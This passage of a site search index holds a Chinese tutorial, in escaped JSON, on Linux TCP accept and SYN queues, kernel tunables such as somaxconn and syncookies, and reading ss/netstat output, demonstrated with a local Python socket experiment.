queue\uff09\u662f\u5728\u4ec0\u4e48\u4e0a\u7684\u4e00\u4e2a\u961f\u5217\uff0c\u662f\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\uff1f\u8fd8\u662f\u5e94\u7528\u7a0b\u5e8f\u4e0a\u7684\uff1f\u8fd8\u662f\u6bcf\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\uff1f\u8fd9\u4e2a\u95ee\u9898\u56f0\u60d1\u6211\u5f88\u4e45\uff0c\u7ec8\u4e8e\u5728\u4e00\u7bc7\u6587\u7ae0\u627e\u5230\u4e86\u3002 IP Sysctl \u2014 Linux \u5185\u6838\u6587\u6863 (kernel.org) \u6211\u8fd9\u7ffb\u8bd1\u4e86\u4e0b\u7f51\u9875\uff0c\u5927\u81f4\u8bb2\u7684\u5c31\u662f\u662f\u5728listen\u72b6\u6001\u4e0b\u7684socket\u4e0a\u7684\u8fde\u63a5\u961f\u5217\uff08\u5176\u5b9e\u5c31\u662fsocket\u4e0a\u7684\uff0c\u56e0\u4e3asocket\u53ea\u80fd\u7ed1\u5b9a\u4e00\u4e2a\u7aef\u53e3\u3002\u7136\u540e\u5728\u8ba9\u7ed1\u5b9a\u7684\u7aef\u53e3\u8fdb\u5165listen\u72b6\u6001\uff09 \u5927\u81f4\u7684\u610f\u601d\u4e3a\u5efa\u7acb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u8fc7\u6765\u5efa\u7acb\u8fde\u63a5\u7684syn\u5305\u540e\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8fde\u63a5\u5c31\u4f1a\u8fdb\u5165\u670d\u52a1\u7aef\u7684\u534a\u8fde\u63a5\u961f\u5217\u91cc\u9762\uff0c\u7136\u540e\u670d\u52a1\u7aef\u7ed9\u5ba2\u6237\u7aef\u56desyn+ack\u5305\uff0c\u7136\u540e\u670d\u52a1\u7aef\u63a5\u5230\u5ba2\u6237\u7aef\u56de\u7684ack\u5305\u540e\uff0c\u8fde\u63a5\u5c31\u4f1a\u8fdb\u5165\u670d\u52a1\u7aef\u7684\u5168\u8fde\u63a5\u961f\u5217\u4e2d\u3002 \u57fa\u672c\u6982\u5ff5 \u5168\u8fde\u63a5\u961f\u5217\u5927\u5c0f\u53d6\u51b3\u4e8ebacklog \u548csomaxconn \u7684\u6700\u5c0f\u503c\uff0c\u4e5f\u5c31\u662f min(backlog,somaxconn) somaxconn \u662fLinux\u5185\u6838\u53c2\u6570\uff0c\u9ed8\u8ba4128\uff0c\u53ef\u901a\u8fc7/proc/sys/net/core/somaxconn\u8fdb\u884c\u914d\u7f6e backlog\u662f listen(int sockfd,int backlog)\u51fd\u6570\u4e2d\u7684\u53c2\u6570backlog\uff0cTomcat \u9ed8\u8ba4100\uff0cNginx \u9ed8\u8ba4511. \u534a\u8fde\u63a5\u961f\u5217\u7684\u5927\u5c0f\u53ea\u80fd\u901a\u8fc7 /proc/sys/net/ipv4/tcp_max_syn_backlog\u6765\u8bbe\u7f6e /proc/sys/net/ipv4/tcp_abort_on_overflow \u5168\u8fde\u63a5\u961f\u5217\u5df2\u6ee1\u5c31\u4f1a\u6839\u636etcp_abort_on_overflow\u7b56\u7565\u8fdb\u884c\u5904\u7406\u3002 \u5f53tcp_abort_on_overflow=0\uff0c\u5168\u8fde\u63a5\u961f\u5217\u6ee1\u4e86\uff0c\u5ba2\u6237\u7aef\u53d1\u6765ACK\uff0c\u670d\u52a1\u7aef\u76f4\u63a5\u4e22\u5f03\u8be5ACK\uff0c\u6b64\u65f6\u670d\u52a1\u7aef\u5904\u4e8e\u3010SYN-RECV\u3011\u7684\u72b6\u6001\uff0c\u5ba2\u6237\u7aef\u5904\u4e8e\u3010ESTABLISHED\u3011\u7684\u72b6\u6001\u3002\u5728\u8be5\u72b6\u6001\u4e0b\u4f1a\u6709\u4e00\u4e2a\u5b9a\u65f6\u5668\u91cd\u4f20\u670d\u52a1\u7aef SYN/ACK \u7ed9\u5ba2\u6237\u7aef\uff08\u4e0d\u8d85\u8fc7 /proc/sys/net/ipv4/tcp_synack_retries \u6307\u5b9a\u7684\u6b21\u6570\uff0cLinux\u4e0b\u9ed8\u8ba45\uff0c\u76ee\u7684\u4e3a\u4e86\u8ba9\u5ba2\u6237\u7aef\u91cd\u53d1ACK\uff0c\u5f53\u5168\u8fde\u63a5\u961f\u5217\u6709\u7a7a\u4f59\u4e86\uff0c\u8fd9\u6837\u8fde\u63a5\u8fd8\u4f1a\u91cd\u65b0\u5efa\u7acb\u8d77\u6765\uff09\u3002\u8d85\u8fc7\u540e\uff0c\u670d\u52a1\u5668\u4e0d\u5728\u91cd\u4f20\uff0c\u540e\u7eed\u4e5f\u4e0d\u4f1a\u6709\u4efb\u4f55\u52a8\u4f5c\u3002\u5982\u679c\u6b64\u65f6\u5ba2\u6237\u7aef\u53d1\u9001\u6570\u636e\u8fc7\u6765\uff0c\u670d\u52a1\u7aef\u4f1a\u8fd4\u56deRST\u3002\uff08\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u5f02\u5e38\u539f\u56e0\u4e86\uff09 \u5f53tcp_abort_on_overflow=1\uff0c\u5168\u8fde\u63a5\u961f\u5217\u6ee1\u4e86\uff0c\u5ba2\u6237\u7aef\u53d1\u6765ACK\uff0c\u670d\u52a1\u7aef\u76f4\u63a5\u8fd4\u56deRST\u901a\u77e5\u5ba2\u6237\u7aef\uff0c\u8868\u793a\u5e9f\u6389\u8fd9\u4e2a\u63e1\u624b\u8fc7\u7a0b\u548c\u8fd9\u4e2a\u8fde\u63a5\uff0c\u5ba2\u6237\u7aef\u4f1a\u62a5connection reset by peer\u3002 /proc/sys/net/ipv4/tcp_syncookies \u5982\u679c SYN \u534a\u8fde\u63a5\u961f\u5217\u5df2\u6ee1\uff0c\u6b63\u5e38\u9ed8\u8ba4\u53ea\u80fd\u4e22\u5f03\u540e\u7eed\u5ba2\u6237\u7aef\u53d1\u6765\u7684SYN\u5305\uff0c\u4e0d\u8fc7\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u53c2\u6570\uff0c\u7ed5\u8fc7\u534a\u8fde\u63a5\u961f\u5217\u3002 \u5f00\u542f syncookies \u529f\u80fd\u5c31\u53ef\u4ee5\u5728\u4e0d\u4f7f\u7528 SYN \u534a\u8fde\u63a5\u961f\u5217\u7684\u60c5\u51b5\u4e0b\u6210\u529f\u5efa\u7acb\u8fde\u63a5 \uff0c\u5f53\u5f00\u542f\u4e86 syncookies \u529f\u80fd\u5c31\u4e0d\u4f1a\u4e22\u5f03\u8fde\u63a5\u3002 syncookies \u662f\u8fd9\u4e48\u505a\u7684\uff1a\u670d\u52a1\u5668\u6839\u636e\u5f53\u524d\u72b6\u6001\u8ba1\u7b97\u51fa\u4e00\u4e2a\u503c\uff0c\u653e\u5728\u5df1\u65b9\u53d1\u51fa\u7684 SYN+ACK \u62a5\u6587\u4e2d\u53d1\u51fa\uff0c\u5f53\u5ba2\u6237\u7aef\u8fd4\u56de ACK \u62a5\u6587\u65f6\uff0c\u53d6\u51fa\u8be5\u503c\u9a8c\u8bc1\uff0c\u5982\u679c\u5408\u6cd5\uff0c\u5c31\u8ba4\u4e3a\u8fde\u63a5\u5efa\u7acb\u6210\u529f\uff0c\u5982\u4e0a\u56fe\u6240\u793a tcp_syncookies \u53c2\u6570\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u4e2a\u503c\uff1a 0 \u503c\uff0c\u8868\u793a\u5173\u95ed\u8be5\u529f\u80fd\uff1b 1 \u503c\uff0c\u8868\u793a\u4ec5\u5f53 SYN \u534a\u8fde\u63a5\u961f\u5217\u653e\u4e0d\u4e0b\u65f6\uff0c\u518d\u542f\u7528\u5b83\uff1b 2 \u503c\uff0c\u8868\u793a\u65e0\u6761\u4ef6\u5f00\u542f\u529f\u80fd\uff1b tcp_syncookies = 1 \u65f6\uff0c\u534a\u8fde\u63a5\u961f\u5217\u6ee1\u540e\uff0c\u540e\u7eed\u7684\u8bf7\u6c42\u5c31\u4e0d\u4f1a\u5b58\u653e\u5230\u534a\u8fde\u63a5\u961f\u5217\u4e86\uff0c\u800c\u662f\u5728\u7b2c\u4e8c\u6b21\u63e1\u624b\u7684\u65f6\u5019\uff0c\u670d\u52a1\u7aef\u4f1a\u8ba1\u7b97\u4e00\u4e2a cookie \u503c\uff0c\u653e\u5165\u5230 SYN +ACK \u5305\u4e2d\u7684\u5e8f\u5217\u53f7\u53d1\u7ed9\u5ba2\u6237\u7aef\uff0c\u5ba2\u6237\u7aef\u6536\u5230\u540e\u5e76\u56de ack \uff0c\u670d\u52a1\u7aef\u5c31\u4f1a\u6821\u9a8c\u8fde\u63a5\u662f\u5426\u5408\u6cd5\uff0c\u5408\u6cd5\u5c31\u76f4\u63a5\u628a\u8fde\u63a5\u653e\u5165\u5230\u5168\u8fde\u63a5\u961f\u5217\u3002 \u547d\u4ee4\u5b66\u4e60 \u67e5\u770b\u5168\u8fde\u63a5\u72b6\u6001\uff1a \u67e5\u770b\u5f53\u524dsocket\u5168\u8fde\u63a5\u5927\u5c0f\uff1a netstat -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684 Recv-Q \u6216\u8005 ss -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684 Recv-Q \u67e5\u770b\u5f53\u524dsocket\u6700\u5927\u5168\u8fde\u63a5\u5927\u5c0f\uff1a netstat -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684Send-Q \u6216\u8005 ss -tan | grep LISTEN | grep \u7aef\u53e3\u53f7 \u4e2d\u7684 Send-Q ss \u548c netstat \uff0c\u901a\u8fc7\u8fd9\u4e24\u4e2a\u547d\u4ee4\u53ef\u4ee5\u67e5\u770b\u5168\u961f\u5217\u5927\u5c0f\u3002 \u7f51\u4e0a\u8bf4\uff08 ss -tan \u7ed3\u679c\u548c netstat -tan \u7684\u7ed3\u679c\u4e2d\u7684 Recv-Q Send-Q \u5bb9\u6613\u6df7\u6dc6\uff09\uff0c\u90a3\u662f\u56e0\u4e3anetstat\u7684\u8001\u7248\u672c\u7684man\u89e3\u91ca\u548c\u65b0\u7248\u672cman\u89e3\u91ca\u4e0d\u540c\uff0c\u622a\u56fe\u5982\u4e0b\u3002\u5728\u65b0\u7248\u672c\u4e2d\u8fd9\u4e2a\u91ca\u4e49\u548c ss \u547d\u4ee4\u7684\u91ca\u4e49\u662f\u76f8\u540c\u7684\u3002\u6240\u4ee5\u4e0d\u5b58\u5728\u6df7\u6dc6\uff0c\u5c31\u662f\u4e00\u6837\u7684 \u65b0\u7248\u672c\uff1a \u8001\u7248\u672c\uff1a \uff08\u5410\u69fd\u4e00\u4e0b\uff0cnetstat man\u624b\u518c\u8001\u7248\u672c\u4e3a2000\u5e74\u7248\u672c\uff0c\u65b0\u7248\u672c\u4e3a2014\u3002\u81f3\u5c11netstat\u5728\u547d\u4ee4\u4e2d\u8fd8\u89e3\u91ca\u4e86\u4e00\u4e0bRecv-Q\u548cSend-Q\uff0c\u800css\u7684man\u624b\u518c\u4e2d\u4ec0\u4e48\u90fd\u6ca1\u5199\uff0c\u4e0d\u77e5\u9053\u7f51\u53cb\u90fd\u4ece\u54ea\u91cc\u627e\u7684\u8d44\u6599\uff0c\u7f51\u4e0a\u968f\u4fbf\u4e00\u641c\uff0c\u7f51\u6587\u8bf4\u7684\u57fa\u672c\u5c31\u662f\u548c\u65b0\u7248\u672cnetstat\u91ca\u4e49\u4e00\u6837\uff09 \u8d34\u4e00\u4e0b\u6700\u65b0\u7684netstat\u548css\u7684\u5728\u7ebfman\u624b\u518c\uff1a ss(8) - Linux manual page (man7.org) netstat(8) - Linux manual page (man7.org) \u56fd\u8bed\u7248\u672c\u7684\uff1a netstat \u56fd\u8bed\u7ffb\u8bd1\u7684\u5c31\u662f\u8001\u7248\u672c\u7684 \u65b0\u6807\u7b7e\u9875 (debian.org) ss \u547d\u4ee4\u6ca1\u627e\u5230\u56fd\u8bed\u7684\uff0c\u8d34\u4e00\u4e2a\u89e3\u91ca\u6bd4\u8f83\u5168\u7684\uff1a ss \u547d\u4ee4\uff0cLinux ss \u547d\u4ee4\u8be6\u89e3\uff1a\u6bd4 netstat \u597d\u7528\u7684socket\u7edf\u8ba1\u4fe1\u606f\uff0ciproute2 \u5305\u9644\u5e26\u7684\u53e6\u4e00\u4e2a\u5de5\u5177\uff0c\u5141\u8bb8\u4f60\u67e5\u8be2 socket \u7684\u6709\u5173\u7edf\u8ba1\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) ss \u548c netstat \u547d\u4ee4\u83b7\u53d6\u7684 Recv-Q/Send-Q \u5728\u300cLISTEN \u72b6\u6001\u300d\u548c\u300cESTABLISHED \u72b6\u6001\uff08\u540cCLOSE_WAIT\uff0cFIN_WAIT1\uff0cFIN_WAIT2\uff0cTIME_WAIT\u3002\u8fd9\u91cc\u81ea\u5df1\u505a\u8fc7\u5b9e\u9a8c\uff0c\u786e\u5b9e\u662f\u76f8\u540c\u7684\uff0c\u53ef\u80fd\u8fd9\u4e9b\u72b6\u6001\u662fESTABLISHED\u4e4b\u540e\u7684\u72b6\u6001\uff0c\u6240\u4ee5\u4e5f\u8ba4\u4e3a\u662fESTABLISHED\u72b6\u6001\uff09\u300d\u6240\u8868\u8fbe\u7684\u542b\u4e49\u662f\u4e0d\u540c\u7684 \u5728\u300cLISTEN \u72b6\u6001\u300d\u65f6 Recv-Q\uff1a\u5f53\u524d\u5168\u8fde\u63a5\u961f\u5217\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u5df2\u5b8c\u6210\u4e09\u6b21\u63e1\u624b\u5e76\u7b49\u5f85\u670d\u52a1\u7aef accept() \u7684 TCP \u8fde\u63a5\uff1b Send-Q\uff1a\u5f53\u524d socket \u5168\u8fde\u63a5\u6700\u5927\u961f\u5217\u957f\u5ea6\u3002 \u5728\u300cESTABLISHED \u72b6\u6001\uff08\u540cCLOSE_WAIT\uff0cFIN_WAIT1\uff0cFIN_WAIT2\uff0cTIME_WAIT\uff09\u300d\u65f6 Recv-Q\uff1a\u5df2\u6536\u5230\u4f46\u672a\u88ab\u5e94\u7528\u8fdb\u7a0b\u8bfb\u53d6\u7684\u5b57\u8282\u6570\uff1b Send-Q\uff1a\u5df2\u53d1\u9001\u4f46\u672a\u6536\u5230\u786e\u8ba4\u7684\u5b57\u8282\u6570\uff1b \u67e5\u770b\u534a\u8fde\u63a5\u72b6\u6001\uff1a \u5f53\u524d\u534a\u8fde\u63a5\u591a\u5c11\uff1a ss -tan | grep SYN_RECV | wc -l \u67e5\u770b\u534a\u8fde\u63a5\u961f\u5217\u6700\u5927\u957f\u5ea6\uff1a cat /proc/sys/net/ipv4/tcp_max_syn_backlog \u5f53\u524d\u7cfb\u7edf\u53c2\u6570\uff1a [root@VM-0-16-centos pycharm]# cat /proc/sys/net/ipv4/tcp_syncookies #\u534a\u8fde\u63a5\u653e\u4e0d\u4e0b\u662f\uff0c\u542f\u7528cookies\u6765\u5efa\u7acb\u8fde\u63a5 1 [root@VM-0-16-centos pycharm]# cat /proc/sys/net/ipv4/tcp_abort_on_overflow #\u5168\u8fde\u63a5\u6ee1\u4e86\u540e\uff0c\u670d\u52a1\u7aef\u4e22\u5f03\u5ba2\u6237\u7aef\u53d1\u6765\u7684ACK\u5305 0 [root@VM-0-16-centos pycharm]# cat /proc/sys/net/ipv4/tcp_max_syn_backlog #\u534a\u8fde\u63a5\u5927\u5c0f 256 [root@VM-0-16-centos pycharm]# cat /proc/sys/net/core/somaxconn #\u5168\u8fde\u63a5\u5927\u5c0f 128 \u4e3a\u4e86\u66f4\u52a0\u6df1\u523b\u7684\u4f53\u4f1a\u4e00\u4e0b\uff0c\u6211\u5199\u6bb5Python\u4ee3\u7801\u6a21\u62df\u4e00\u4e0b\u5168\u8fde\u63a5\u5806\u79ef\u7684\u60c5\u51b5\u3002 \u670d\u52a1\u7aef\u4ee3\u7801\uff1a import socket import time socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # \u521b\u5efasocket\u5bf9\u8c61 socket.bind(('127.0.0.1', 4323)) # \u7ed1\u5b9a\u5730\u5740 socket.listen(5) # \u5168\u8fde\u63a5\u961f\u5217\u8bbe\u7f6e\u4e3a5 time.sleep(1000) # \u6a21\u62df \u8ba9\u670d\u52a1\u7aef\u5728accept()\u4e4b\u524dhung\u4f4f conn, addr = socket.accept() # \u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5 print('\u6b22\u8fceaddr{}'.format(addr)) # \u6253\u5370\u8bbf\u95ee\u7684\u7528\u6237\u4fe1\u606f print('\u6b22\u8fceconn{}'.format(conn)) data = conn.recv(1024) dt = data.decode('utf-8') # \u63a5\u6536\u4e00\u4e2a1024\u5b57\u8282\u7684\u6570\u636e print('\u6536\u5230\uff1a', dt) \u5ba2\u6237\u7aef\u4ee3\u7801\uff1a import socket import time socket = socket.socket() # \u521b\u5efasocket\u5bf9\u8c61 socket.connect(('127.0.0.1', 4323)) # \u5efa\u7acb\u8fde\u63a5 ab = '\u5ba2\u6237\u7aef\u53d1\u51fa' socket.send(ab.encode('utf-8')) # \u53d1\u9001\u6570\u636e time.sleep(1000) #\u4e3a\u4e86\u7ef4\u6301\u8fde\u63a5\uff0c\u8ba9\u5ba2\u6237\u7aef\u4e0d\u9000\u51fa\u3002 socket.close() \u670d\u52a1\u7aef\u542f\u52a8\uff1a LISTEN\u72b6\u6001\u7684\u8fde\u63a5Send-Q\uff0c\u53ef\u4ee5\u770b\u5230\u5168\u8fde\u63a5\u5927\u5c0f\u4e3a5 [root@VM-0-16-centos pycharm]# python3 server.py & [1] 28870 [root@VM-0-16-centos pycharm]# ss -lnp | grep 4323 tcp LISTEN 0 5 127.0.0.1:4323 *:* users:((\"python3\",pid=28870,fd=3)) [root@VM-0-16-centos pycharm]# ss -tan | grep 4323 LISTEN 0 5 127.0.0.1:4323 *:* \u5ba2\u6237\u7aef\u542f\u52a83\u6b21\uff1a [root@VM-0-16-centos pycharm]# python3 client.py & [1] 29030 [root@VM-0-16-centos pycharm]# python3 client.py & [2] 29038 [root@VM-0-16-centos pycharm]# python3 client.py & [3] 29046 \u670d\u52a1\u7aef\u663e\u793a\uff1a \u8fd9\u662f\u4ece ss -lnp \u4e0a\u5df2\u7ecf\u770b\u5230\uff0cLISTEN\u72b6\u6001\u7684\u8fde\u63a5 Recv-Q \u662f3\uff0c Send-Q \u662f5\u3002\u5f53\u524d\u5168\u8fde\u63a5\u4e2a\u6570\u4e3a3\u3002 ss -tan \u5728ESTAB\u7684\u72b6\u6001\u4e0b\uff0c\u53ef\u4ee5\u770b\u523015\uff0c\u90a3\u662f\u56e0\u4e3a\u5ba2\u6237\u7aef\u53d1\u4e865\u4e2a\u5b57\u7ed9\u670d\u52a1\u7aef\uff0c\u4e00\u4e2a\u5b57\u5360\u75283\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e3a15\u3002 [root@VM-0-16-centos pycharm]# ss -lnp | grep 4323 Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 3 5 127.0.0.1:4323 *:* users:((\"python3\",pid=28870,fd=3)) [root@VM-0-16-centos pycharm]# ss -tan | grep 4323 State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 3 5 127.0.0.1:4323 *:* ESTAB 0 0 127.0.0.1:40448 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40448 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40452 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40462 ESTAB 0 0 127.0.0.1:40462 127.0.0.1:4323 ESTAB 0 0 127.0.0.1:40452 127.0.0.1:4323 \u5ba2\u6237\u7aef\u518d\u6267\u884c7\u6b21\uff1a [root@VM-0-16-centos pycharm]# python3 client.py & [4] 29407 [root@VM-0-16-centos pycharm]# python3 client.py & [5] 29410 [root@VM-0-16-centos pycharm]# python3 client.py & [6] 29412 [root@VM-0-16-centos pycharm]# python3 client.py & [7] 29418 [root@VM-0-16-centos pycharm]# python3 client.py & [8] 29419 [root@VM-0-16-centos pycharm]# python3 client.py & [9] 29420 [root@VM-0-16-centos pycharm]# python3 client.py & [10] 29421 \u670d\u52a1\u7aef\u663e\u793a: LISTEN\u72b6\u6001\u7684\u8fde\u63a5 Recv-Q \u662f6\uff0c Send-Q \u662f5\u3002\u5f53\u524d\u5168\u8fde\u63a5\u4e2a\u6570\u4e3a6\u3002 \u5f53\u5168\u8fde\u63a5\u6ee1\u4e86\uff0c\u540e\u7eed\u5ba2\u6237\u7aef\u53d1\u9001\u7684ACK\u5305\u5c31\u4e22\u4e86\uff0c\u6240\u4ee5\u4f1a\u51fa\u73b0\u56db\u4e2aSYN-RECV\u72b6\u6001\u7684\u8fde\u63a5\u3002 \u89e3\u91ca\u4e0b\u4e3a\u4ec0\u4e48\u4f1a\u662f\u56db\u4e2a\uff0c\u56e0\u4e3atcp_abort_on_overflow\u53c2\u6570\uff0c\u5f53\u5f53\u524d\u5168\u8fde\u63a5\u5927\u5c0f>\u8bbe\u7f6e\u7684\u5168\u8fde\u63a5\u5927\u5c0f\u65f6\uff0c\u540e\u7eed\u7684\u5ba2\u6237\u7aef\u7684ACK\u5305\u624d\u4f1a\u4e22\u5f03\uff0c5=5\u65f6\u4e0d\u89e6\u53d1\uff0c6>5\u65f6\u624d\u89e6\u53d1\u3002 SYN-RECV\u72b6\u6001\u7684\u8fde\u63a5\u4f1a\u8fdb\u5165\u534a\u8fde\u63a5\u961f\u5217\u3002\u534a\u8fde\u63a5\u72b6\u6001\u4e5f\u4f1a\u6ee1\u7684\u65f6\u5019\u3002\u6240\u4ee5\u7cfb\u7edf\u4e0a\u7684SYN-RECV\u4e0d\u80fd\u592a\u591a\u3002 ss -tan \u5728ESTAB\u7684\u72b6\u6001\u4e0b\uff0cRecv-Q\u53ef\u4ee5\u770b\u523015\uff0c\u90a3\u662f\u56e0\u4e3a\u5ba2\u6237\u7aef\u53d1\u4e865\u4e2a\u5b57\u7ed9\u670d\u52a1\u7aef\uff0c\u4e00\u4e2a\u5b57\u5360\u75283\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u4e3a15\u3002 \u5728ESTAB\u7684\u72b6\u6001\u4e0b\uff0cSend-Q\u53ef\u4ee5\u770b\u523015\uff0c\u90a3\u662f\u56e0\u4e3a\u6709\u56db\u4e2a\u670d\u52a1\u7aef\u8fde\u63a5\u72b6\u6001\u4e3aSYN-RECV\uff0c\u800c\u5ba2\u6237\u7aef\u4e3aESTAB\uff0c\u4ee3\u8868\u5ba2\u6237\u7aef\u5df2\u7ecf\u7ed9\u670d\u52a1\u7aef\u53d1\u9001\u4e865\u4e2a\u5b57\uff0c\u4f46\u662f\u670d\u52a1\u7aef\u8fd8\u6ca1\u6709\u63a5\u6536\u3002\u8bc1\u660e\u5728netstat\u4e2d\u5bf9ESTAB\u4e2d\u63a5\u6536\u7684\u610f\u601d\u548csocket.accept() \u4e0d\u662f\u4e00\u4e2a\u542b\u4e49\u3002 [root@VM-0-16-centos pycharm]# ss -tan | grep 4323 State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 6 5 127.0.0.1:4323 *:* SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40626 SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40628 SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40632 SYN-RECV 0 0 127.0.0.1:4323 127.0.0.1:40630 ESTAB 0 0 127.0.0.1:40620 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40620 ESTAB 0 0 127.0.0.1:40622 127.0.0.1:4323 ESTAB 0 15 127.0.0.1:40628 127.0.0.1:4323 ESTAB 0 0 127.0.0.1:40448 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40448 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40622 ESTAB 0 15 127.0.0.1:40632 127.0.0.1:4323 ESTAB 0 15 127.0.0.1:40626 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40452 ESTAB 0 0 127.0.0.1:40618 127.0.0.1:4323 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40618 ESTAB 15 0 127.0.0.1:4323 127.0.0.1:40462 ESTAB 0 0 127.0.0.1:40462 127.0.0.1:4323 ESTAB 0 0 127.0.0.1:40452 127.0.0.1:4323 ESTAB 0 15 127.0.0.1:40630 127.0.0.1:4323 [root@VM-0-16-centos pycharm]# ss -lnp | grep 4323 Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port tcp LISTEN 6 5 127.0.0.1:4323 *:* users:((\"python3\",pid=28870,fd=3)) \u672a\u5b8c\u5f85\u7eed\u3002\u3002\u3002 \u540e\u9762\u6211\u4f1a\u6a21\u62df\u4e0b\u5176\u4ed6\u60c5\u51b5\u3002\u3002\u3002 \u76f8\u5173\u6587\u7ae0\u63a8\u8350\uff1a \u5185\u5bb9\u8ddf\u6211\u6587\u7ae0\u8bb2\u76f8\u9a73\u65f6\uff0c\u4ee5\u6211\u7684\u4e3a\u51c6 \u65b0\u6807\u7b7e\u9875 (cnblogs.com)","title":"\u5168\u8fde\u63a5\u961f\u5217\u548c\u534a\u8fde\u63a5\u961f\u5217"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_1","text":"\u8fd9\u53ef\u80fd\u662f\u5168\u7f51\u8bb2\u7684\u6700\u7ec6\u81f4\u7684\u5168\u8fde\u63a5\u548c\u534a\u8fde\u63a5\u7684\u89e3\u6790\u4e86\u3002","title":"\u5168\u8fde\u63a5\u961f\u5217\u548c\u534a\u8fde\u63a5\u961f\u5217"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_2","text":"\u9996\u5148\u5b66\u4e60\u4e00\u5f20\u56fe\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e09\u6b21\u63e1\u624b\u7684\u4e00\u4e2a\u8fc7\u7a0b\u3002 \u6211\u5728\u7f51\u4e0a\u627e\u4e86\u5f88\u4e45\uff0c\u5173\u4e8e\u534a\u8fde\u63a5\u961f\u5217\uff08sync queue\uff09\u548c\u5168\u8fde\u63a5\u961f\u5217\uff08accept queue\uff09\u662f\u5728\u4ec0\u4e48\u4e0a\u7684\u4e00\u4e2a\u961f\u5217\uff0c\u662f\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\uff1f\u8fd8\u662f\u5e94\u7528\u7a0b\u5e8f\u4e0a\u7684\uff1f\u8fd8\u662f\u6bcf\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\uff1f\u8fd9\u4e2a\u95ee\u9898\u56f0\u60d1\u6211\u5f88\u4e45\uff0c\u7ec8\u4e8e\u5728\u4e00\u7bc7\u6587\u7ae0\u627e\u5230\u4e86\u3002 IP Sysctl \u2014 Linux \u5185\u6838\u6587\u6863 (kernel.org) \u6211\u8fd9\u7ffb\u8bd1\u4e86\u4e0b\u7f51\u9875\uff0c\u5927\u81f4\u8bb2\u7684\u5c31\u662f\u662f\u5728listen\u72b6\u6001\u4e0b\u7684socket\u4e0a\u7684\u8fde\u63a5\u961f\u5217\uff08\u5176\u5b9e\u5c31\u662fsocket\u4e0a\u7684\uff0c\u56e0\u4e3asocket\u53ea\u80fd\u7ed1\u5b9a\u4e00\u4e2a\u7aef\u53e3\u3002\u7136\u540e\u5728\u8ba9\u7ed1\u5b9a\u7684\u7aef\u53e3\u8fdb\u5165listen\u72b6\u6001\uff09 \u5927\u81f4\u7684\u610f\u601d\u4e3a\u5efa\u7acb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u7aef\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u8fc7\u6765\u5efa\u7acb\u8fde\u63a5\u7684syn\u5305\u540e\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8fde\u63a5\u5c31\u4f1a\u8fdb\u5165\u670d\u52a1\u7aef\u7684\u534a\u8fde\u63a5\u961f\u5217\u91cc\u9762\uff0c\u7136\u540e\u670d\u52a1\u7aef\u7ed9\u5ba2\u6237\u7aef\u56desyn+ack\u5305\uff0c\u7136\u540e\u670d\u52a1\u7aef\u63a5\u5230\u5ba2\u6237\u7aef\u56de\u7684ack\u5305\u540e\uff0c\u8fde\u63a5\u5c31\u4f1a\u8fdb\u5165\u670d\u52a1\u7aef\u7684\u5168\u8fde\u63a5\u961f\u5217\u4e2d\u3002","title":"\u5927\u81f4\u91ca\u4e49"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E5%85%A8%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E5%92%8C%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97/#_3","text":"\u5168\u8fde\u63a5\u961f\u5217\u5927\u5c0f\u53d6\u51b3\u4e8ebacklog \u548csomaxconn \u7684\u6700\u5c0f\u503c\uff0c\u4e5f\u5c31\u662f min(backlog,somaxconn) somaxconn \u662fLinux\u5185\u6838\u53c2\u6570\uff0c\u9ed8\u8ba4128\uff0c\u53ef\u901a\u8fc7/proc/sys/net/core/somaxconn\u8fdb\u884c\u914d\u7f6e backlog\u662f 